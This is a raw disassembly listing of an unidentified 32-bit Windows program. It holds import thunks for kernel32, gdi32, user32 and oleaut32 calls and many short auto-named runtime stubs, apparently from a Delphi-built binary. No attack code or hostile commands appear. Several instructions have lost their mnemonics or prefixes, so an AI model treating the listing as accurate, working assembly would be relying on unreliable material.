jmp [ GetDiskFreeSpaceA@IAT ]
GetExitCodeThread
jmp [ GetExitCodeThread@IAT ]
GetFileSize
jmp [ GetFileSize@IAT ]
GetFullPathNameA
jmp [ __import_lookup_table_6(kernel32:GetFullPathNameA) ]
GetLocalTime
jmp [ GetLocalTime@IAT ]
GetLocaleInfoA
jmp [ GetLocaleInfoA@IAT ]
GetModuleHandleA
jmp [ GetModuleHandleA@IAT ]
GetStringTypeExA
jmp [ GetStringTypeExA@IAT ]
GetSystemInfo
jmp [ GetSystemInfo@IAT ]
GetTempPathA
jmp [ GetTempPathA@IAT ]
GetVersion
jmp [ GetVersion@IAT ]
GetVersionExA
jmp [ GetVersionExA@IAT ]
GlobalAlloc
jmp [ GlobalAlloc@IAT ]
GlobalFindAtomA
jmp [ GlobalFindAtomA@IAT ]
GlobalFree
jmp [ GlobalFree@IAT ]
GlobalLock
jmp [ GlobalLock@IAT ]
GlobalHandle
jmp [ GlobalHandle@IAT ]
GlobalReAlloc
jmp [ GlobalReAlloc@IAT ]
GlobalUnlock
jmp [ GlobalUnlock@IAT ]
LeaveCriticalSection
jmp [ LeaveCriticalSection@IAT ]
LoadLibraryA
jmp [ LoadLibraryA@IAT ]
LoadResource
jmp [ __import_lookup_table_6(kernel32:LoadResource) ]
LockResource
jmp [ __import_lookup_table_6(kernel32:LockResource) ]
ReadFile
jmp [ ReadFile@IAT ]
ResetEvent
jmp [ __import_lookup_table_6(kernel32:ResetEvent) ]
ResumeThread
jmp [ ResumeThread@IAT ]
SetEndOfFile
jmp [ __import_lookup_table_6(kernel32:SetEndOfFile) ]
SetEvent
jmp [ __import_lookup_table_6(kernel32:SetEvent) ]
SetFilePointer
jmp [ __import_lookup_table_6(kernel32:SetFilePointer) ]
SetThreadLocale
jmp [ __import_lookup_table_6(kernel32:SetThreadLocale) ]
SizeofResource
jmp [ __import_lookup_table_6(kernel32:SizeofResource) ]
sub_406244
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
VirtualAlloc
jmp [ __import_lookup_table_6(kernel32:VirtualAlloc) ]
VirtualFree
jmp [ __import_lookup_table_6(kernel32:VirtualFree) ]
VirtualQuery
jmp [ __import_lookup_table_6(kernel32:VirtualQuery) ]
WaitForSingleObject
jmp [ __import_lookup_table_6(kernel32:WaitForSingleObject) ]
WinExec
jmp [ __import_lookup_table_6(kernel32:WinExec) ]
lstrcpyA
jmp [ lstrcpyA@IAT ]
GetFileVersionInfoA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoA) ]
GetFileVersionInfoSizeA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoSizeA) ]
VerQueryValueA
jmp [ __import_lookup_table_7(version:VerQueryValueA) ]
CopyEnhMetaFileA
jmp [ __import_lookup_table_8(gdi32:CopyEnhMetaFileA) ]
CreateBitmap
jmp [ CreateBitmap@IAT ]
CreateBrushIndirect
jmp [ CreateBrushIndirect@IAT ]
CreateDIBSection
jmp [ CreateDIBSection@IAT ]
CreateDIBitmap
jmp [ __import_lookup_table_8(gdi32:CreateDIBitmap) ]
CreateHalftonePalette
jmp [ CreateHalftonePalette@IAT ]
CreatePalette
jmp [ CreatePalette@IAT ]
CreatePenIndirect
jmp [ CreatePenIndirect@IAT ]
DeleteEnhMetaFile
jmp [ __import_lookup_table_8(gdi32:DeleteEnhMetaFile) ]
ExcludeClipRect
jmp [ __import_lookup_table_8(gdi32:ExcludeClipRect) ]
ExtCreatePen
jmp [ __import_lookup_table_8(gdi32:ExtCreatePen) ]
ExtTextOutA
jmp [ __import_lookup_table_8(gdi32:ExtTextOutA) ]
GetBrushOrgEx
jmp [ GetBrushOrgEx@IAT ]
GetClipBox
jmp [ GetClipBox@IAT ]
GetClipRgn
jmp [ __import_lookup_table_8(gdi32:GetClipRgn) ]
GetCurrentPositionEx
jmp [ __import_lookup_table_8(gdi32:GetCurrentPositionEx) ]
GetDCOrgEx
jmp [ __import_lookup_table_8(gdi32:GetDCOrgEx) ]
GetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:GetDIBColorTable) ]
GetEnhMetaFileHeader
jmp [ GetEnhMetaFileHeader@IAT ]
GetPixel
jmp [ GetPixel@IAT ]
GetTextExtentPoint32A
jmp [ GetTextExtentPoint32A@IAT ]
GetWindowOrgEx
jmp [ __import_lookup_table_8(gdi32:GetWindowOrgEx) ]
LineTo
jmp [ LineTo@IAT ]
MaskBlt
jmp [ __import_lookup_table_8(gdi32:MaskBlt) ]
MoveToEx
jmp [ __import_lookup_table_8(gdi32:MoveToEx) ]
PlayEnhMetaFile
jmp [ PlayEnhMetaFile@IAT ]
PolyPolyline
jmp [ PolyPolyline@IAT ]
Polyline
jmp [ Polyline@IAT ]
RectVisible
jmp [ __import_lookup_table_8(gdi32:RectVisible) ]
Rectangle
jmp [ __import_lookup_table_8(gdi32:Rectangle) ]
SetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:SetBrushOrgEx) ]
SetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:SetDIBColorTable) ]
SetEnhMetaFileBits
jmp [ SetEnhMetaFileBits@IAT ]
SetPixel
jmp [ SetPixel@IAT ]
SetROP2
jmp [ SetROP2@IAT ]
SetViewportOrgEx
jmp [ __import_lookup_table_8(gdi32:SetViewportOrgEx) ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
ActivateKeyboardLayout
jmp [ ActivateKeyboardLayout@IAT ]
AdjustWindowRectEx
jmp [ AdjustWindowRectEx@IAT ]
CharLowerA
jmp [ __import_lookup_table_9(user32:CharLowerA) ]
BeginDeferWindowPos
jmp [ __import_lookup_table_9(user32:BeginDeferWindowPos) ]
BeginPaint
jmp [ __import_lookup_table_9(user32:BeginPaint) ]
CallNextHookEx
jmp [ __import_lookup_table_9(user32:CallNextHookEx) ]
CallWindowProcA
jmp [ __import_lookup_table_9(user32:CallWindowProcA) ]
CharLowerBuffA
jmp [ CharLowerBuffA@IAT ]
CharNextA
jmp [ __import_lookup_table_9(user32:CharNextA) ]
CharToOemA
jmp [ __import_lookup_table_9(user32:CharToOemA) ]
CharUpperBuffA
jmp [ __import_lookup_table_9(user32:CharUpperBuffA) ]
CheckMenuItem
jmp [ __import_lookup_table_9(user32:CheckMenuItem) ]
ClientToScreen
jmp [ ClientToScreen@IAT ]
CloseClipboard
jmp [ __import_lookup_table_9(user32:CloseClipboard) ]
CreateIcon
jmp [ __import_lookup_table_9(user32:CreateIcon) ]
CreateMenu
jmp [ __import_lookup_table_9(user32:CreateMenu) ]
CreatePopupMenu
jmp [ __import_lookup_table_9(user32:CreatePopupMenu) ]
DefFrameProcA
jmp [ __import_lookup_table_9(user32:DefFrameProcA) ]
DefWindowProcA
jmp [ __import_lookup_table_9(user32:DefWindowProcA) ]
DeferWindowPos
jmp [ DeferWindowPos@IAT ]
DestroyIcon
jmp [ __import_lookup_table_9(user32:DestroyIcon) ]
DestroyMenu
jmp [ __import_lookup_table_9(user32:DestroyMenu) ]
DestroyWindow
jmp [ DestroyWindow@IAT ]
DispatchMessageA
jmp [ DispatchMessageA@IAT ]
DrawIcon
jmp [ DrawIcon@IAT ]
DrawIconEx
jmp [ DrawIconEx@IAT ]
DrawMenuBar
jmp [ DrawMenuBar@IAT ]
EmptyClipboard
jmp [ EmptyClipboard@IAT ]
EnableWindow
jmp [ __import_lookup_table_9(user32:EnableWindow) ]
EndDeferWindowPos
jmp [ __import_lookup_table_9(user32:EndDeferWindowPos) ]
EndPaint
jmp [ EndPaint@IAT ]
EnumThreadWindows
jmp [ EnumThreadWindows@IAT ]
EnumWindows
jmp [ EnumWindows@IAT ]
EqualRect
jmp [ EqualRect@IAT ]
FindWindowA
jmp [ __import_lookup_table_9(user32:FindWindowA) ]
GetCaretPos
jmp [ __import_lookup_table_9(user32:GetCaretPos) ]
GetClassNameA
jmp [ GetClassNameA@IAT ]
GetClientRect
jmp [ GetClientRect@IAT ]
GetCursor
jmp [ GetCursor@IAT ]
GetDC
jmp [ __import_lookup_table_9(user32:GetDC) ]
GetDCEx
jmp [ GetDCEx@IAT ]
GetDoubleClickTime
jmp [ __import_lookup_table_9(user32:GetDoubleClickTime) ]
GetForegroundWindow
jmp [ __import_lookup_table_9(user32:GetForegroundWindow) ]
GetIconInfo
jmp [ __import_lookup_table_9(user32:GetIconInfo) ]
GetKeyNameTextA
jmp [ __import_lookup_table_9(user32:GetKeyNameTextA) ]
GetKeyboardLayout
jmp [ GetKeyboardLayout@IAT ]
GetKeyboardLayoutList
jmp [ __import_lookup_table_9(user32:GetKeyboardLayoutList) ]
GetKeyboardState
jmp [ GetKeyboardState@IAT ]
GetLastActivePopup
jmp [ __import_lookup_table_9(user32:GetLastActivePopup) ]
GetMenu
jmp [ __import_lookup_table_9(user32:GetMenu) ]
GetMenuItemID
jmp [ GetMenuItemID@IAT ]
GetMenuItemInfoA
jmp [ GetMenuItemInfoA@IAT ]
GetMenuStringA
jmp [ GetMenuStringA@IAT ]
GetMessageTime
jmp [ GetMessageTime@IAT ]
__imp_GetWindow
jmp [ GetWindow@IAT ]
GetParent
jmp [ GetParent@IAT ]
GetPropA
jmp [ GetPropA@IAT ]
GetScrollInfo
jmp [ GetScrollInfo@IAT ]
GetScrollPos
jmp [ GetScrollPos@IAT ]
GetScrollRange
jmp [ GetScrollRange@IAT ]
GetSubMenu
jmp [ __import_lookup_table_9(user32:GetSubMenu) ]
GetSysColor
jmp [ __import_lookup_table_9(user32:GetSysColor) ]
GetSysColorBrush
jmp [ __import_lookup_table_9(user32:GetSysColorBrush) ]
GetSystemMenu
jmp [ __import_lookup_table_9(user32:GetSystemMenu) ]
GetTopWindow
jmp [ GetTopWindow@IAT ]
GetWindowDC
jmp [ __import_lookup_table_9(user32:GetWindowDC) ]
GetWindowPlacement
jmp [ GetWindowPlacement@IAT ]
GetWindowRect
jmp [ GetWindowRect@IAT ]
GetWindowTextA
jmp [ GetWindowTextA@IAT ]
__imp_GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
InsertMenuItemA
jmp [ InsertMenuItemA@IAT ]
IsCharAlphaNumericA
jmp [ __import_lookup_table_9(user32:IsCharAlphaNumericA) ]
IsChild
jmp [ IsChild@IAT ]
IsDialogMessageA
jmp [ IsDialogMessageA@IAT ]
IsRectEmpty
jmp [ IsRectEmpty@IAT ]
IsWindow
jmp [ IsWindow@IAT ]
IsWindowEnabled
jmp [ IsWindowEnabled@IAT ]
IsZoomed
jmp [ IsZoomed@IAT ]
LoadBitmapA
jmp [ LoadBitmapA@IAT ]
LoadIconA
jmp [ LoadIconA@IAT ]
LoadStringA
jmp [ LoadStringA@IAT ]
MapVirtualKeyA
jmp [ MapVirtualKeyA@IAT ]
MessageBeep
jmp [ MessageBeep@IAT ]
MessageBoxA
jmp [ MessageBoxA@IAT ]
MsgWaitForMultipleObjects
jmp [ MsgWaitForMultipleObjects@IAT ]
OemToCharA
jmp [ OemToCharA@IAT ]
OpenClipboard
jmp [ __import_lookup_table_9(user32:OpenClipboard) ]
PostQuitMessage
jmp [ __import_lookup_table_9(user32:PostQuitMessage) ]
RedrawWindow
jmp [ __import_lookup_table_9(user32:RedrawWindow) ]
RegisterClassA
jmp [ __import_lookup_table_9(user32:RegisterClassA) ]
RegisterClipboardFormatA
jmp [ RegisterClipboardFormatA@IAT ]
ReleaseCapture
jmp [ __import_lookup_table_9(user32:ReleaseCapture) ]
ReleaseDC
jmp [ __import_lookup_table_9(user32:ReleaseDC) ]
RemoveMenu
jmp [ __import_lookup_table_9(user32:RemoveMenu) ]
ScrollWindow
jmp [ ScrollWindow@IAT ]
SetActiveWindow
jmp [ __import_lookup_table_9(user32:SetActiveWindow) ]
SetCapture
jmp [ __import_lookup_table_9(user32:SetCapture) ]
SetClassLongA
jmp [ SetClassLongA@IAT ]
SetForegroundWindow
jmp [ SetForegroundWindow@IAT ]
SetKeyboardState
jmp [ SetKeyboardState@IAT ]
SetMenuItemInfoA
jmp [ SetMenuItemInfoA@IAT ]
SetParent
jmp [ __import_lookup_table_9(user32:SetParent) ]
SetScrollInfo
jmp [ SetScrollInfo@IAT ]
SetWindowPlacement
jmp [ __import_lookup_table_9(user32:SetWindowPlacement) ]
SetWindowTextA
jmp [ SetWindowTextA@IAT ]
SetWindowsHookExA
jmp [ SetWindowsHookExA@IAT ]
ShowCursor
jmp [ ShowCursor@IAT ]
ShowOwnedPopups
jmp [ __import_lookup_table_9(user32:ShowOwnedPopups) ]
TrackPopupMenu
jmp [ TrackPopupMenu@IAT ]
TranslateMDISysAccel
jmp [ TranslateMDISysAccel@IAT ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
UnhookWindowsHookEx
jmp [ UnhookWindowsHookEx@IAT ]
UnionRect
jmp [ UnionRect@IAT ]
UnregisterClassA
jmp [ __import_lookup_table_9(user32:UnregisterClassA) ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
WaitMessage
jmp [ WaitMessage@IAT ]
WinHelpA
jmp [ WinHelpA@IAT ]
WindowFromPoint
jmp [ WindowFromPoint@IAT ]
sub_406a98
call GetTickCount
retn
sub_406aa0
xor eax eax
retn
sub_406aa4
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_406ab4
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_406ad0
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_406ae4
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_406b38
call sub_406a8c
retn
sub_406b40
call sub_406a8c
retn
CreateWindowExA
jmp [ CreateWindowExA@IAT ]
sub_406d1d
jmp sub_4039f4
sub_406d24
pop ebp
retn
sub_406d28
sub [ rw-data ] 0x1
retn
sub_406d55
jmp sub_4039f4
sub_406d5c
pop ebp
retn
sub_406d60
sub [ rw-data ] 0x1
retn
sub_407065
jmp sub_4039f4
sub_40706c
pop ebp
retn
sub_407070
sub [ rw-data ] 0x1
retn
sub_407b51
add eax 0xffffffd4
jmp sub_40cfb4
sub_407b59
add eax 0xffffffd4
jmp sub_40ce5c
sub_407b61
add eax 0xffffffd4
jmp sub_40cef8
sub_407b73
add [ esp + 0x4 ] 0xffffffd4
jmp sub_4057b4
sub_407b7d
add [ esp + 0x4 ] 0xffffffd4
jmp sub_4057c8
sub_407f14
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_407edc
test eax eax
sete al
pop esi
pop ebx
retn
sub_40842c
call sub_408408
retn
sub_4084c4
push eax
call CloseHandle
retn
sub_408534
push ebx
mov ebx eax
mov eax ebx
call sub_4084cc
inc eax
setne al
pop ebx
retn
sub_40870c
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_408720
push esi
mov esi eax
xchg edx eax
call sub_4028c8
mov eax esi
pop esi
retn
sub_4088e0
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_4026cc
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_4088f4
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_40892c
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_4026ec
sub_408994
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_402828
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_4089b8
push ebx
mov ebx eax
mov eax ebx
call sub_404074
pop ebx
retn
sub_408d1b
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_404074
pop eax
pop ebx
retn
sub_408fd3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_40912e
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_40948b
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_40948b
sub_409548
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404534
mov edx esi
xor ecx ecx
call sub_4093d4
pop esi
pop ebx
retn
sub_4095bc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404534
mov edx esi
mov cl 0x1
call sub_4093d4
pop esi
pop ebx
retn
sub_409c36
jmp sub_4039f4
sub_409c3d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409d2e
jmp sub_4039f4
sub_409d35
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a4d9
jmp sub_4039f4
sub_40a4e0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a568
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40a50c
pop ebp
retn 0x8
sub_40a6ad
jmp sub_4039f4
sub_40a6b4
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40ab57
jmp sub_4039f4
sub_40ab5e
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b043
jmp sub_4039f4
sub_40b04a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b0f5
jmp sub_4039f4
sub_40b0fc
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40b19f
jmp sub_4039f4
sub_40b1a6
pop esi
pop ecx
pop ebp
retn
sub_40b382
jmp sub_4039f4
sub_40b389
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b3e0
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40b6d2
jmp sub_4039f4
sub_40b7a0
jmp sub_4039f4
sub_40b7c8
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_403254
sub_40b964
jmp sub_4039f4
sub_40b96b
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b974
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_403a2c
sub_40b981
retn
sub_40b984
push ebp
mov ebp esp
call sub_40b8c8
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40b974
pop ebp
retn 0x4
sub_40b9a0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_403a2c
retn
sub_40ba38
push ebx
mov ebx eax
mov eax ebx
call sub_40b9b8
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40bc0b
jmp sub_4039f4
sub_40bc12
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40bcd7
jmp sub_4039f4
sub_40bcde
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40bce8
call sub_40b574
mov eax 0x1
call sub_403fd8
sub_40be6c
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40bf45
jmp sub_4039f4
sub_40bf62
jmp sub_4039f4
sub_40bf69
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40c014
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40bf78
mov ecx eax
sub_40c200
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40c220
push eax
call CharNextA
retn
sub_40c544
jmp sub_4039f4
sub_40c54b
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c5b4
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40ca0b
jmp sub_4039f4
sub_40ca12
pop ebx
mov esp ebp
pop ebp
retn
Sleep
jmp [ __import_lookup_table_10(kernel32:Sleep) ]
sub_40cb50
jmp sub_4039f4
sub_40cb57
pop ebx
mov esp ebp
pop ebp
retn
sub_40cb5c
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40cac0
sub_40cb6c
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40cb88
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_4026ec
pop ebx
retn
sub_40cc10
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40cc1c
xchg [ eax ] edx
mov eax edx
retn
sub_40cc7c
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40cd0c
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40ce24
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40ce4c
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40d0c7
jmp sub_4039f4
sub_40d0ce
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40d13c
jmp sub_4039f4
sub_40d143
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d161
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40d15a
jmp sub_4039f4
sub_40d161
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40d624
jmp sub_4039f4
sub_40d62b
pop ebp
retn
VariantInit
jmp [ VariantInit@IAT ]
VariantChangeType
jmp [ __import_lookup_table_11(oleaut32:VariantChangeType) ]
sub_40d6a4
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40d70a
jmp sub_4039f4
sub_40d711
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d776
jmp sub_4039f4
sub_40d77d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d7e2
jmp sub_4039f4
sub_40d7e9
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d84e
jmp sub_4039f4
sub_40d855
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d8ba
jmp sub_4039f4
sub_40d8c1
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d939
jmp sub_4039f4
sub_40d940
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40d9ac
jmp sub_4039f4
sub_40d9b3
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40da1c
jmp sub_4039f4
sub_40da23
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40da90
jmp sub_4039f4
sub_40da97
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ __import_lookup_table_11(oleaut32:SafeArrayCreate) ]
SafeArrayGetLBound
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetLBound) ]
SafeArrayGetUBound
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetUBound) ]
sub_40de1d
jmp sub_4039f4
sub_40de24
pop ebp
retn
sub_40de28
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40daec
sub_40de39
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40e45a
jmp sub_4039f4
sub_40e461
pop ecx
pop ebp
retn
sub_40e4f3
jmp sub_4039f4
sub_40e4fa
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e54a
jmp sub_4039f4
sub_40e551
pop ecx
pop ebp
retn
sub_40e5e3
jmp sub_4039f4
sub_40e5ea
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e63a
jmp sub_4039f4
sub_40e641
pop ecx
pop ebp
retn
sub_40e889
jmp sub_4039f4
sub_40e890
pop ebx
mov esp ebp
pop ebp
retn
sub_40e922
jmp sub_4039f4
sub_40e929
pop ecx
pop ebp
retn
sub_40e92c
push ebx
mov ebx eax
mov eax ebx
call sub_40ebc4
mov [ ebx ] 0x1
pop ebx
retn
sub_40ebc4
test [ eax ] 0xbfe8
jne r-xdata
call sub_40eb48
retn
mov [ eax ] 0x0
retn
sub_40ebd8
push eax
call sub_40ebc4
pop eax
retn
sub_40ee38
call sub_40eeec
retn
sub_40f056
jmp sub_4039f4
sub_40f05d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f101
jmp sub_4039f4
sub_40f108
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f12a
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_40476c
retn
sub_40f123
jmp sub_4039f4
sub_40f12a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f186
jmp sub_4039f4
sub_40f18d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f209
jmp sub_4039f4
sub_40f74f
jmp sub_4039f4
sub_40f756
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f7e9
jmp sub_4039f4
sub_40f7f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f80d
lea eax [ ebp - 0x14 ]
call sub_404754
retn
sub_40f806
jmp sub_4039f4
sub_40f80d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f86a
jmp sub_4039f4
sub_40f871
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f913
jmp sub_4039f4
sub_40f930
jmp sub_4039f4
sub_40f937
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40fe92
jmp sub_4039f4
sub_40fe99
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ff44
push eax
call sub_40ebc4
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_40ff58
push eax
call sub_40ebc4
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_40ffd0
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40eeec
add esp 0x10
sub_41027a
jmp sub_4039f4
sub_410281
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4102c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40ebc4
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_4102dc
mov edx 0x80020004
call sub_4102c4
retn
sub_4102fc
jmp [ edi + ebx * 8 ]
sub_41036d
jmp sub_4039f4
sub_410374
pop esi
pop ebx
pop ebp
retn
sub_410378
push ebp
mov ebp esp
call sub_410538
pop ebp
retn 0x4
sub_410404
push ebp
mov ebp esp
call sub_410538
pop ebp
retn 0x4
sub_4104e7
jmp sub_4039f4
sub_4104ee
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403290
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403614
sub_410510
xor eax eax
retn
sub_410514
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_410528
mov [ ecx ] 0x8
mov al 0x1
retn
sub_410530
call sub_40e410
retn
sub_410538
call sub_40e500
retn
sub_410540
call sub_40e8d8
retn
sub_410548
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_41055c
call sub_410538
retn
sub_410564
push ebp
mov ebp esp
call sub_410540
pop ebp
retn 0x8
sub_41057c
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_410658
jmp sub_4039f4
sub_410721
jmp sub_4039f4
sub_410728
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410745
lea eax [ ebp - 0x10 ]
call sub_404074
retn
sub_41073e
jmp sub_4039f4
sub_410745
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_410750
call sub_40e92c
retn
sub_4107c7
jmp sub_4039f4
sub_4107ce
pop ebp
retn
sub_410871
jmp sub_4039f4
sub_410878
pop ebp
retn
sub_4109d1
jmp sub_4039f4
sub_4109d8
pop ebp
retn
sub_4109dc
sub [ rw-data ] 0x1
retn
sub_410a10
xor edx edx
mov dl [ eax + 0x1 ]
lea eax [ eax + edx + 0x2 ]
retn
sub_410c94
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_4040c8
pop esi
pop ebx
retn
sub_410d30
jmp sub_4039f4
sub_410d37
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_410e32
jmp sub_4039f4
sub_410e39
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_411038
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40eeec
